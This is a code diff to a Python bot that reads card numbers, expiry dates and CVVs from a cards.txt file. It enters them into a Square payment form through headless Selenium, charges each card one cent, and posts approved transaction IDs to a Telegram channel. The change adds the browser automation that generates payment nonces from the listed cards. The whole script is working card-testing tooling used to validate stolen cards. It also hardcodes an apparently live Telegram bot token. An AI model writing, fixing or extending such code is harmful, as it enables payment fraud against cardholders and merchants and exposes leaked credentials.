@@ -3,9 +3,11 @@ import telebot
 import os
 import json
 import logging
-import aiofiles  # Ensure aiofiles is imported for async file handling
-from square.client import Client  # Import the Square client
-from flask import Flask, request, jsonify, render_template, Response  # Import Flask-related classes
+import aiofiles
+from flask import Flask, jsonify, request, render_template, Response
+from square.client import Client
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 
 # Configure logging to write to a file for displaying on the webpage
 logging.basicConfig(filename='bot_activity.log', level=logging.INFO, format='%(asctime)s %(message)s')
@@ -24,18 +26,18 @@ config = load_config()
 # Setup Square Client
 square_client = Client(
     access_token=config['square']['access_token'],  # Access token from Square dashboard
-    environment='production'  # Use production for live transactions
+    environment='sandbox'  # Use sandbox for testing purposes
 )
 
 # Initialize Flask app
 app = Flask(__name__)
 
 # Hardcoded Telegram Bot Token
-API_TOKEN = "7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw"  # User's Telegram bot token
+API_TOKEN = "7785068082:AAEwD4mFUHLVLSeA5JrXZYnj8UKt52cFpHw"
 bot = telebot.TeleBot(API_TOKEN)
 
 # Set the target Telegram channel
-target_channel = os.getenv('TARGET_CHANNEL', '@cctalks700')  # Set in Render's environment variables
+target_channel = os.getenv('TARGET_CHANNEL', '@cctalks700')
 
 # Function to send confirmation to the target channel
 def send_to_target_channel(transaction_info):
@@ -45,17 +47,16 @@ def send_to_target_channel(transaction_info):
     except Exception as e:
         logging.error(f"Failed to send message: {e}")
 
-# Function to handle the Square payment using the tokenized card nonce
+# Function to process the payment using the Square API
 async def process_payment(nonce):
     try:
-        # Create a payment request to Square for $0.01 using the nonce from the front end
         body = {
-            "source_id": nonce,  # Use the actual nonce received from the front-end
+            "source_id": nonce,  # Nonce generated from the frontend
             "amount_money": {
-                "amount": 1,  # Amount in cents, $0.01
+                "amount": 1,  # Amount in cents ($0.01)
                 "currency": "USD"
             },
-            "idempotency_key": os.urandom(16).hex()  # Ensure each transaction is unique
+            "idempotency_key": os.urandom(16).hex()  # Ensure unique transaction
         }
 
         result = square_client.payments.create_payment(body)
@@ -71,37 +72,51 @@ async def process_payment(nonce):
         logging.error(f"Error processing payment: {e}")
         return {"status": "error", "error": str(e)}
 
-# Function to scrape card details from cards.txt file and process payments
+# Function to scrape card details from cards.txt and generate nonce using the frontend
 async def scrape_and_process_payments():
     try:
+        # Set up Selenium WebDriver to automate the nonce generation
+        chrome_options = Options()
+        chrome_options.add_argument("--headless")
+        chrome_options.add_argument("--disable-gpu")
+        driver = webdriver.Chrome(options=chrome_options)
+
+        # Load the frontend where the Square Payment Form is located
+        driver.get('http://localhost:5000')
+
         async with aiofiles.open('cards.txt', 'r') as file:
             lines = await file.readlines()
 
         for line in lines:
-            card_details = line.strip().split('|')  # Split card details by '|'
+            card_details = line.strip().split('|')  # Split card details
 
-            # Here, we will tokenize the card data and create a nonce
-            # The card data would be sent to the front-end in a production scenario to create the nonce
-            logging.info(f"Processing card: {card_details[0]}")  # Log the card being processed
+            # Set card details into the form using Selenium
+            driver.execute_script(f'document.querySelector("#card-number").value = "{card_details[0]}";')
+            driver.execute_script(f'document.querySelector("#expiration-date").value = "{card_details[1]}/{card_details[2]}";')
+            driver.execute_script(f'document.querySelector("#cvv").value = "{card_details[3]}";')
 
-            # Replace the following part with a nonce that you generate via the Square Payment Form on the front end
-            # In production, this should be handled via the front end to keep PCI compliance
-            nonce = "cnon:card-nonce-ok"  # Placeholder nonce for testing
+            # Execute the JavaScript function to generate the nonce
+            nonce = driver.execute_script('return scrapeAndGetNonce();')  # Fetch nonce from frontend
 
-            # Process the payment asynchronously
-            approved_payment = await process_payment(nonce)  # Pass the nonce to process payment
-            if approved_payment and approved_payment['status'] == "success":
-                send_to_target_channel(approved_payment['transaction']['id'])  # Send approved transaction ID to Telegram
+            if nonce:
+                logging.info(f"Nonce generated: {nonce}")
+                approved_payment = await process_payment(nonce)  # Process the payment
+                if approved_payment and approved_payment['status'] == "success":
+                    send_to_target_channel(approved_payment['transaction']['id'])  # Send transaction to Telegram
+            else:
+                logging.error(f"Failed to generate nonce for card: {card_details[0]}")
+
+        driver.quit()
 
     except Exception as e:
         logging.error(f"Error in scraping and processing payments: {e}")
 
-# Route to serve the bot activity logs as an HTML page
+# Serve the bot activity logs as an HTML page
 @app.route('/')
 def index():
     return render_template('index.html')
 
-# Route to stream the log file to the front-end
+# Route to stream the log file to the frontend
 @app.route('/logs')
 def stream_logs():
     def generate():
@@ -116,5 +131,5 @@ def stream_logs():
 # Start the scraping and processing
 if __name__ == '__main__':
     logging.info("Bot is running...")
-    asyncio.run(scrape_and_process_payments())  # Start the payment processing
+    asyncio.run(scrape_and_process_payments())  # Start payment processing loop
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))  # Render uses the $PORT environment variable
